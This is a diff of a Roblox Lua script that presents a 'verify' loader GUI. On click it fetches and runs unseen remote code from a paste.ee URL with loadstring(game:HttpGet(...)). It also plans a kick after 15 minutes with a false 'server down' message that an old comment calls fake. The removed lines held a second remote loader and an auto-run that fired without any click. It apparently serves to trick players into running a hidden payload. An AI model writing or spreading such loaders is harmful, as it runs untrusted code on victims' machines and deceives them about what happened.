@@ -1,15 +1,15 @@
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local localPlayer = Players.LocalPlayer
-local VirtualUser = game:GetService("VirtualUser")
 
--- Anti-AFK
+-- Anti-AFK (prevents being kicked for idling)
+local VirtualUser = game:GetService("VirtualUser")
 Players.LocalPlayer.Idled:Connect(function()
 	VirtualUser:CaptureController()
 	VirtualUser:ClickButton2(Vector2.new())
 end)
 
--- Script Verify GUI
+-- Main GUI creation
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "DrixVerifyGui"
 screenGui.ResetOnSpawn = false
@@ -24,9 +24,9 @@ frame.Active = true
 frame.Draggable = true
 frame.Parent = screenGui
 
-local corner3 = Instance.new("UICorner")
-corner3.CornerRadius = UDim.new(0, 12)
-corner3.Parent = frame
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = frame
 
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, 0, 0, 40)
@@ -47,23 +47,19 @@ loadButton.TextScaled = true
 loadButton.Font = Enum.Font.SourceSansBold
 loadButton.Parent = frame
 
-local corner4 = Instance.new("UICorner")
-corner4.CornerRadius = UDim.new(0, 8)
-corner4.Parent = loadButton
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 8)
+buttonCorner.Parent = loadButton
 
--- Rainbow Text Effect
+-- Rainbow text effect
 local hue = 0
 RunService.RenderStepped:Connect(function()
 	hue = (hue + 0.01) % 1
 	loadButton.TextColor3 = Color3.fromHSV(hue, 1, 1)
 end)
 
--- Unified Launch Function
-local launched = false
-local function launchScript()
-	if launched then return end
-	launched = true
-
+-- Load button behavior
+loadButton.MouseButton1Click:Connect(function()
 	loadButton.Active = false
 	loadButton.Text = "LAUNCHED"
 
@@ -82,9 +78,9 @@ local function launchScript()
 	warningFrame.ZIndex = 10
 	warningFrame.Parent = warningGui
 
-	local corner5 = Instance.new("UICorner")
-	corner5.CornerRadius = UDim.new(0, 10)
-	corner5.Parent = warningFrame
+	local frameCorner = Instance.new("UICorner")
+	frameCorner.CornerRadius = UDim.new(0, 10)
+	frameCorner.Parent = warningFrame
 
 	local warningLabel = Instance.new("TextLabel")
 	warningLabel.Size = UDim2.new(1, -20, 1, -20)
@@ -97,7 +93,6 @@ local function launchScript()
 	warningLabel.ZIndex = 11
 	warningLabel.Parent = warningFrame
 
-	-- Blinking text effect
 	task.spawn(function()
 		while warningLabel and warningLabel.Parent do
 			warningLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
@@ -107,41 +102,22 @@ local function launchScript()
 		end
 	end)
 
-	-- Auto-remove warning after 1 minute
 	task.delay(60, function()
 		if warningGui then
 			warningGui:Destroy()
 		end
 	end)
 
-	-- Kick after 15 min (fake server down)
 	task.delay(15 * 60, function()
 		localPlayer:Kick("PLS TRY THIS SCRIPT AFTER 3-4HOUR DUE TO THE SERVER DOWN")
 	end)
 
-	-- Run both external scripts safely
 	task.delay(2, function()
-		local function tryLoad(url)
-			local success, err = pcall(function()
-				loadstring(game:HttpGet(url))()
-			end)
-			return success, err
-		end
-
-		local s1success, s1err = tryLoad("https://paste.ee/r/E0CcrDF0")
-		local s2success, s2err = tryLoad("https://raw.githubusercontent.com/ilovenew/Loading/refs/heads/main/Script")
-
-		if not s1success or not s2success then
-			if warningLabel then
-				warningLabel.Text = "⚠️ Failed to load one or both scripts."
-				warningLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
-			end
+		local success, err = pcall(function()
+loadstring(game:HttpGet("https://paste.ee/r/E0CcrDF0"))()		end)
+		if not success and warningLabel then
+			warningLabel.Text = "Failed to load script."
+			warningLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
 		end
 	end)
-end
-
--- Manual click
-loadButton.MouseButton1Click:Connect(launchScript)
-
--- Auto-run after 20 seconds if user doesn't click
-task.delay(20, launchScript)
+end)
